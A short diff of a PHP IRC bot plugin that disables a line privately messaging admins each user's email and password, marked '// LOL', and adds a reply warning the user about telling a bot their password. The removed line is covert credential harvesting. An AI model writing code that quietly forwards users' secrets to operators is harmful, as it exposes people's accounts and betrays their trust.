@@ -85,8 +85,9 @@ foreach (Dog::getServers() as $server)
 		if (Dog_PrivServer::hasPermChar($server, $admin, 'i'))
 		{
 			// LOL
-			$admin->sendPRIVMSG(sprintf('FACEIN %s!%s %s %s', $user->displayName(), $user->getSID(), $email, $pass));
+// 			$admin->sendPRIVMSG(sprintf('FACEIN %s!%s %s %s', $user->displayName(), $user->getSID(), $email, $pass));
 		}
 	}
 }
+$plugin->reply("Thanks for telling your password to a bot. I hope you know what could have happened now!");
 ?>
